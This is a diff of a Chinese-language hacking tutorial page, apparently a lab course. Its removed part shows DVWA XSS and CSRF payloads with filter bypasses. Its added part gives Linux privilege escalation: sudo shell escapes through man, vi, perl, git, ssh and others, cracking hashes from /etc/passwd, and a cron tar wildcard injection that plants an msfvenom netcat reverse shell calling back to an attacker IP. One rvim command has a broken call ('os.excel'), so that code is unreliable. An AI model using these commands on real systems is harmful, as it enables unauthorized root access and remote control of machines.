-<h2 id="反射型跨站点脚本xss">反射型跨站点脚本（XSS）
-</h2><p>打开dvwa中XSS 反射型页面，随便输入几个字符测试，以retr0为例</p>
-<h3 id="low-低难度-1">low 低难度
-</h3><p>右键查看页面源代码发现提交的字符会直接填到下面的“你好”后面，如图：</p>
-<p><img src="https://free.picui.cn/free/2025/11/30/692bde48f2573.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<p>结合右下角查看php源代码也可以得到</p>
-<p><strong>漏洞解析：</strong> 因此我们可以在输入的字符串中插入<code>&lt;script&gt;&lt;/script&gt;</code>的html脚本，让网页执行我们的脚本代码</p>
-<p>填入<code>ret&lt;script&gt;alert(123)&lt;/script&gt;r0</code>,网页弹窗内容‘123’</p>
-<h3 id="medium-中等难度">medium 中等难度
-</h3><p>点击右下角查看源代码发现添加了过滤机制：</p>
-<div class="highlight"><div class="chroma">
+</div><h3 id="man文档查看">man文档查看
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo man man
+</span></span><span class="line"><span class="cl">!/bin/sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="socat网络工具">socat网络工具
+</h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$name</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s1">&#39;&lt;script&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;name&#39;</span> <span class="p">]</span> <span class="p">);</span> 
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo socat stdin exec:/bin/sh
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><strong>漏洞解析：</strong> 屏蔽代码只过滤了一次<code>&lt;script&gt;</code>，因此我们使用<strong>双写绕过</strong>，填入<code>ret&lt;sc&lt;script&gt;ript&gt;alert(123)&lt;/script&gt;r0</code>，其中<code>&lt;script&gt;</code>被过滤后又重新组合为新的<code>&lt;script&gt;</code>从而生效；此外将<code>&lt;script&gt;</code>中的字符替换为大写也可以，例如<code>ret&lt;sCRIpt&gt;alert(123)&lt;/script&gt;r0</code>（原理：前端代码不识别<code>&lt;script&gt;</code>大小写）</p>
-<h3 id="high-高难度-1">high 高难度
-</h3><p>点击右下角查看源代码发现升级了过滤机制：</p>
-<div class="highlight"><div class="chroma">
+</div><h3 id="ssh连接">ssh连接
+</h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$name</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span> <span class="s1">&#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;name&#39;</span> <span class="p">]</span> <span class="p">);</span> 
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo ssh -o ProxyCommand=&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39; x
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>因此直接使用<code>&lt;script&gt;</code>的方法已经完全不可用</p>
-<details class="lake-collapse"><summary id="uac399e3e"><strong><span class="ne-text">补充4(点击展开)：</span></strong></summary><p id="ua01b29af" class="ne-p"><span class="ne-text">html存在以下加载图片的句法：</span></p><p id="ub002ff6c" class="ne-p"><code class="ne-code"><span class="ne-text">&lt;img src='x' onerror='alert(123)'/&gt;</span></code></p><p id="ud33b8c46" class="ne-p"><span class="ne-text">当页面试图加载名为x的图片但是失败时就会把onerror后面的代码当作JavaScript来执行</span></p><p id="u687461e0" class="ne-p"><span class="ne-text">另外还有</span><code class="ne-code"><span class="ne-text">onmouseover=</span></code><span class="ne-text">(鼠标浮过)</span><code class="ne-code"><span class="ne-text">onmouseup=</span></code><span class="ne-text">(鼠标松开)</span><code class="ne-code"><span class="ne-text">onmousedown=</span></code><span class="ne-text">(鼠标按下)等参数可供替换</span></p></details>
-<p><strong>漏洞解析：</strong> 我们利用html图片加载代码来执行js，填入<code>ret&lt;img src='x' onerror='alert(123)'/&gt;r0</code></p>
-<h2 id="存储的跨站点脚本xss">存储的跨站点脚本（XSS）
-</h2><p>打开dvwa中XSS 存储型页面，随便输入几个字符测试</p>
-<h3 id="low-低难度-2">low 低难度
-</h3><p>发现和上面的反射型原理类似，直接填入留言<code>hel&lt;script&gt;alert(123)&lt;/script&gt;lo</code></p>
-<h3 id="medium-中等难度-1">medium 中等难度
-</h3><p>查看源代码发现在留言上启用了htmlspecialchars（将特定的 HTML 字符转换为 HTML 实体字符），名字上添加了过滤，如下：</p>
-<div class="highlight"><div class="chroma">
+</div><h3 id="vi文本编辑器">vi文本编辑器
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo vi -c &#39;:!/bin/sh&#39; /dev/null
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="切换到zsh终端">切换到zsh终端
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo zsh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pico">pico
+</h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$message</span> <span class="o">=</span> <span class="nx">htmlspecialchars</span><span class="p">(</span> <span class="nv">$message</span> <span class="p">);</span> 
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">$name</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s1">&#39;&lt;script&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$name</span> <span class="p">);</span> 
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo pico
+</span></span><span class="line"><span class="cl">^R^X(Ctrl+R Ctrl+X)
+</span></span><span class="line"><span class="cl">reset; sh 1&gt;&amp;0 2&gt;&amp;0
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>因此我们针对名字下手，直接填入<strong>双写绕过</strong>的字符串发现网页对长度有限制，所以要用burp suite修改数据包</p>
-<p>随便填写名字和留言（以123；hello）为例，打开抓包后点击“提交留言”，发现截获的数据包有以下内容（不一定完全一致）：</p>
-<p><code>txtName=123&amp;mtxMessage=hello&amp;btnSign=%E6%8F%90%E4%BA%A4%E7%95%99%E8%A8%80</code></p>
-<p>将这里的123改为<code>hel&lt;sc&lt;script&gt;ript&gt;alert(123)&lt;/script&gt;lo</code>后放行数据包发现提交成功</p>
-<h3 id="high-高难度-2">high 高难度
-</h3><p>查看源代码发现名字对<code>&lt;script&gt;</code>的屏蔽升级：</p>
+</div><h3 id="rvim文本编辑器适用于有python3的环境">rvim文本编辑器（适用于有python3的环境）
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo rvim -c &#39;:python3 import os; os.excel(&#34;/bin/sh&#34;,&#34;sh&#34;,&#34;-c&#34;,&#34;reset; exec sh&#34;)&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="perl">perl
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo perl -e &#39;exec &#34;/bin/sh&#34;;&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="tclsh">tclsh
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo tclsh
+</span></span><span class="line"><span class="cl">exec /bin/sh &lt;@stdin &gt;@stdout 2&gt;@stderr
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="git">git
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo git -p help config
+</span></span><span class="line"><span class="cl">!/bin/sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="script">script
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo script -q /dev/null
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="taskset">taskset
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo taskset 1 /bin/sh -p
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="密码破解">密码破解
+</h2><p>查看<code>/etc/passwd</code>文件</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$name</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span> <span class="s1">&#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$name</span> <span class="p">);</span> 
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">cat /etc/passwd
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><strong>漏洞解析：</strong> 依旧结合抓包使用图片加载机制传入字符串<code>hel&lt;img src='x' onerror='alert(123)'/&gt;lo</code>，成功提交</p>
-<h2 id="跨站请求伪造-csrf">跨站请求伪造 (CSRF)
-</h2><h3 id="low-低难度-3">low 低难度
-</h3><p>打开dvwa中跨站请求伪造 (CSRF)页面，随便输入几个字符测试</p>
-<p>获取当前页面的url：<u>http://127.0.0.1/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=æ´æ¹#</u></p>
-<p><strong>应用场景：</strong> 利用上面的连接制作钓鱼网站诱导某网站管理员点击该链接即可直接修改管理员密码</p>
+</div><p>将用户名后的密文复制到<a class="link" href="https://www.cmd5.com/"  target="_blank" rel="noopener"
+    >md5在线解密破解,md5解密加密</a>进行破解</p>
+<p>例如用户名：hello 密码：nihao（破解后）</p>
+<p>使用<code>su hello</code>并输入密码来切换到这个用户权限</p>
+<h2 id="tar命令注入">tar命令注入
+</h2><blockquote>
+<p>原理：<code>cat /etc/crontab</code>查看自动执行的任务，因此可以将自己的木马程序替换进自动化任务当中</p>
+</blockquote>
+<p>生成木马源代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">msfvenom -p cmd/unix/reverse_netcat lhost=[攻击机ip] lport=[端口号] R
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>例如：<code>mkfifo /tmp/qrmq; nc 192.168.80.133 2233 0&lt;/tmp/qrmq | /bin/sh &gt;/tmp/qrmq 2&gt;&amp;1; rm /tmp/qrmq</code></p>
+<p>使用<code>echo</code>写入代码到<code>shell.sh</code>并用<code>chmod</code>修改权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">echo &#34;木马代码&#34; &gt; shell.sh &amp;&amp; chmod +x shell.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来创建两个文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">echo &gt; &#34;--checkpoint-action=exec=sh shell.sh&#34;
+</span></span><span class="line"><span class="cl">echo &gt; &#34;--checkpoint=1&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这两个文件使得Linux在执行原先的打包备份任务时不会将其视为文件，而是直接借助其高级权限执行木马程序代码</p>
+<p>所以根据我们开始时分析的计划任务列表，只要每过一分钟代码就会被执行一次，启动攻击机：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nc -lvvp [端口号]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>等上(最多)一分钟就好了~</p>
 
 </section>
 
@@ -674,19 +811,6 @@ echo $b;
             
                 
 <article class="">
-    <a href="/p/1.10-linux%E6%8F%90%E6%9D%83%E5%92%8C%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">1.10 Linux提权和密码破解</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
     <a href="/p/1.9-msf%E6%A4%8D%E5%85%A5%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8/">
         
         
@@ -719,6 +843,19 @@ echo $b;
 
         <div class="article-details">
             <h2 class="article-title">1.7 MSF框架以及使用</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.6-%E5%85%B6%E4%BB%96%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.6 其他基础web漏洞介绍</h2>
         </div>
     </a>
 </article>
